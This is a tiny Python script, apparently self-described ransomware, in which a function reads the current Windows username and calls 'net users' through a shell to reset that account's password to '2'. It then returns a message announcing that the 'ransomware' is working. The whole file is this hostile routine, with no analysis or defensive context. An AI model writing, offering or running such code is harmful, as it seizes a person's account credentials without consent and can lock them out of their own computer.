import subprocess
import getpass
def manna(a):
    username=getpass.getuser()
    password="2"
    subprocess.call("net users "+username+" "+password, shell = True)
    aaaa="neelanjan manna ransomware successfully working"
    return(aaaa)